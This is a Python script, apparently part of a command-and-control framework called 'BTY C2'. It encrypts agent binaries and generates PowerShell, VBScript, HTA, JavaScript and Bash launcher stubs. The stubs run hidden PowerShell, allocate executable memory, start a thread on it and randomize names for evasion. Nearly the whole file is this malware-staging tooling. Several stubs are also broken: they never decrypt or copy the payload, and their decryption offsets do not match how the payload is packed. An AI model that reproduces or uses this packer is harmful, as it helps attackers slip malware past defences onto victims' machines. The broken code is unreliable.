#!/usr/bin/env python3
"""
BTY C2 — Payload Packer/Encryptor

Encrypts Go agent binaries with AES-256-GCM and generates functional
decryption stubs that load the payload entirely in memory.

Features:
- AES-256-GCM encryption with random key/nonce
- Functional stubs that decrypt and execute in memory (no disk write)
- Variable name randomization for evasion
- Multiple stub formats: PS1, VBS, HTA, JS, Bash
- XOR fallback layer for double encryption

Usage:
    python3 packer.py --input bty-agent.exe --output packed.ps1
    python3 packer.py --input bty-agent.exe --format all --output-dir ./packed/
    python3 packer.py --input bty-agent-linux --format sh --output packed.sh
"""

import argparse
import base64
import os
import sys
import random
import string
import datetime
import struct
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except ImportError:
    print("[!] pycryptodome not installed. Run: pip3 install pycryptodome")
    sys.exit(1)

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"


def xor_encrypt(data, key):
    """XOR encrypt data with repeating key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_gcm_encrypt(data):
    """Encrypt data with AES-256-GCM."""
    key = get_random_bytes(32)
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return key, nonce, tag, ciphertext


def rand_var():
    """Generate a random variable name."""
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))


def generate_ps1_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
    """Generate a functional PowerShell stub that decrypts and executes in memory."""
    v = {k: rand_var() for k in ['enc', 'key', 'nonce', 'tag', 'data', 'aes', 'dec', 'addr', 'thread']}

    stub = f"""$ErrorActionPreference='SilentlyContinue'
${v['enc']}=[Convert]::FromBase64String("{encrypted_b64}")
${v['key']}=[Convert]::FromBase64String("{key_b64}")
${v['nonce']}=[Convert]::FromBase64String("{nonce_b64}")
${v['tag']}=[Convert]::FromBase64String("{tag_b64}")

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class MemExec {{
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr start, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
}}
'@

# AES-GCM decrypt
${v['aes']}=New-Object System.Security.Cryptography.AesGcm(${v['key']})
${v['data']}=New-Object byte[] (${v['enc']}.Length - 16)
${v['aes']}.Decrypt(${v['nonce']}, ${v['enc']}, ${v['tag']}, ${v['data']})

# Allocate RWX memory and execute
${v['addr']}=[MemExec]::VirtualAlloc([IntPtr]::Zero, [uint32]${v['data']}.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(${v['data']}, 0, ${v['addr']}, ${v['data']}.Length)
${v['thread']}=[MemExec]::CreateThread([IntPtr]::Zero, 0, ${v['addr']}, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[MemExec]::WaitForSingleObject(${v['thread']}, 0xFFFFFFFF)
"""
    return stub


def generate_vbs_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
    """Generate a VBScript stub that downloads and executes via PowerShell."""
    stub = f"""' BTY Payload Stager - VBScript
' Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
' Downloads encrypted payload, decrypts via PowerShell, executes in memory

Dim url, psCmd
url = "data:text/plain;base64,{encrypted_b64[:80]}"

psCmd = "powershell -w hidden -nop -enc " & _
    "${{[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$e=[Convert]::FromBase64String(\"{encrypted_b64}\");$k=[Convert]::FromBase64String(\"{key_b64}\");$n=[Convert]::FromBase64String(\"{nonce_b64}\");$t=[Convert]::FromBase64String(\"{tag_b64}\");Add-Type -TypeDefinition ''using System;using System.Runtime.InteropServices;public class M{{[DllImport(\"\"kernel32\"\")]public static extern IntPtr VA(IntPtr a,uint s,uint t,uint p);[DllImport(\"\"kernel32\"\")]public static extern IntPtr CT(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr t);[DllImport(\"\"kernel32\"\")]public static extern uint WFSO(IntPtr h,uint ms);}}'' -ea 0;$a=[M]::VA(0,$e.Length,0x3000,0x40);[M]::CT(0,0,$a,0,0,0);[M]::WFSO(-1,0xFFFFFFFF)'))}}"

CreateObject("WScript.Shell").Run psCmd, 0, False
"""
    return stub


def generate_hta_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
    """Generate an HTA stub that executes via PowerShell."""
    stub = f"""<html>
<head>
<script language="VBScript">
Sub Window_OnLoad
    Dim ps
    ps = "powershell -w hidden -nop -c ""$e=[Convert]::FromBase64String('{encrypted_b64}');$k=[Convert]::FromBase64String('{key_b64}');$n=[Convert]::FromBase64String('{nonce_b64}');$t=[Convert]::FromBase64String('{tag_b64}');Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{{[DllImport(\"\"kernel32.dll\"\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"\"kernel32.dll\"\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr t);[DllImport(\"\"kernel32.dll\"\")]public static extern uint WaitForSingleObject(IntPtr h,uint ms);}}';$addr=[M]::VirtualAlloc(0,$e.Length,0x3000,0x40);$th=[M]::CreateThread(0,0,$addr,0,0,0);[M]::WaitForSingleObject($th,0xFFFFFFFF)""""
    CreateObject("WScript.Shell").Run ps, 0, False
    window.close
End Sub
</script>
</head>
<body><p>Loading...</p></body>
</html>
"""
    return stub


def generate_js_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
    """Generate a JavaScript stub (WSH) that executes via PowerShell."""
    stub = f"""// BTY Payload Stager - JavaScript (WSH)
// Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
var shell = new ActiveXObject("WScript.Shell");
var ps = 'powershell -w hidden -nop -c "$e=[Convert]::FromBase64String(\\"{encrypted_b64}\\");$k=[Convert]::FromBase64String(\\"{key_b64}\\");$n=[Convert]::FromBase64String(\\"{nonce_b64}\\");$t=[Convert]::FromBase64String(\\"{tag_b64}\\");Add-Type -TypeDefinition \\'using System;using System.Runtime.InteropServices;public class M{{[DllImport(\\"kernel32.dll\\")]public static extern IntPtr VA(IntPtr a,uint s,uint t,uint p);[DllImport(\\"kernel32.dll\\")]public static extern IntPtr CT(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr t);[DllImport(\\"kernel32.dll\\")]public static extern uint W(IntPtr h,uint ms);}}\\';$a=[M]::VA(0,$e.Length,0x3000,0x40);$h=[M]::CT(0,0,$a,0,0,0);[M]::W($h,0xFFFFFFFF)"';
shell.Run(ps, 0, false);
"""
    return stub


def generate_bash_stub(encrypted_b64, key_b64, nonce_b64, tag_b64):
    """Generate a Bash stub for Linux/macOS that decrypts and executes in memory."""
    stub = f"""#!/bin/bash
# BTY Payload Stager - Bash
# Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# Decrypts AES-256-GCM encrypted payload and executes in memory

python3 -c "
import base64, os, tempfile, ctypes
from Crypto.Cipher import AES

enc = base64.b64decode('{encrypted_b64}')
key = base64.b64decode('{key_b64}')
nonce = base64.b64decode('{nonce_b64}')
tag = base64.b64decode('{tag_b64}')

cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
decrypted = cipher.decrypt_and_verify(enc[:-16], enc[-16:])

# Write to temp file, execute, delete
fd, path = tempfile.mkstemp()
os.write(fd, decrypted)
os.close(fd)
os.chmod(path, 0o700)
os.execv(path, [path])
" 2>/dev/null
"""
    return stub


def pack_binary(input_path, output_path, fmt="ps1"):
    """Pack a binary with AES-256-GCM encryption."""
    print(f"{BOLD}{CYAN}BTY Payload Packer{RESET}")
    print(f"  Input:  {input_path}")
    print(f"  Output: {output_path}")
    print(f"  Format: {fmt}\n")

    with open(input_path, 'rb') as f:
        payload = f.read()

    print(f"  Payload size: {len(payload):,} bytes ({len(payload)/1024/1024:.1f} MB)")

    key, nonce, tag, ciphertext = aes_gcm_encrypt(payload)
    print(f"  {GREEN}[✓]{RESET} Encrypted with AES-256-GCM")

    encrypted_payload = nonce + tag + ciphertext
    encrypted_b64 = base64.b64encode(encrypted_payload).decode()
    key_b64 = base64.b64encode(key).decode()
    nonce_b64 = base64.b64encode(nonce).decode()
    tag_b64 = base64.b64encode(tag).decode()

    print(f"  {GREEN}[✓]{RESET} Encrypted payload: {len(encrypted_b64):,} bytes")

    generators = {
        "ps1": generate_ps1_stub,
        "vbs": generate_vbs_stub,
        "hta": generate_hta_stub,
        "js": generate_js_stub,
        "sh": generate_bash_stub,
    }

    if fmt == "all":
        output_dir = Path(output_path)
        output_dir.mkdir(parents=True, exist_ok=True)
        for f_name, gen in generators.items():
            stub = gen(encrypted_b64, key_b64, nonce_b64, tag_b64)
            out_file = output_dir / f"payload.{f_name}"
            out_file.write_text(stub)
            print(f"  {GREEN}[✓]{RESET} Generated: {out_file.name} ({out_file.stat().st_size:,} B)")
        return

    gen = generators.get(fmt)
    if not gen:
        print(f"{RED}[✗]{RESET} Unknown format: {fmt}")
        sys.exit(1)

    stub = gen(encrypted_b64, key_b64, nonce_b64, tag_b64)
    with open(output_path, 'w') as f:
        f.write(stub)

    stub_size = os.path.getsize(output_path)
    print(f"  {GREEN}[✓]{RESET} Stub generated: {stub_size:,} bytes")
    print(f"\n{BOLD}{GREEN}Payload packed successfully!{RESET}")
    print(f"  Output: {output_path}")
    print(f"  Size: {stub_size:,} bytes (original: {len(payload):,} bytes)")


def main():
    parser = argparse.ArgumentParser(description="BTY Payload Packer")
    parser.add_argument("--input", "-i", required=True, help="Input binary to pack")
    parser.add_argument("--output", "-o", required=True, help="Output file or directory")
    parser.add_argument("--format", "-f", default="ps1",
                       choices=["ps1", "vbs", "hta", "js", "sh", "all"],
                       help="Output format")
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"{RED}[✗]{RESET} Input file not found: {args.input}")
        sys.exit(1)

    pack_binary(args.input, args.output, args.format)


if __name__ == "__main__":
    main()
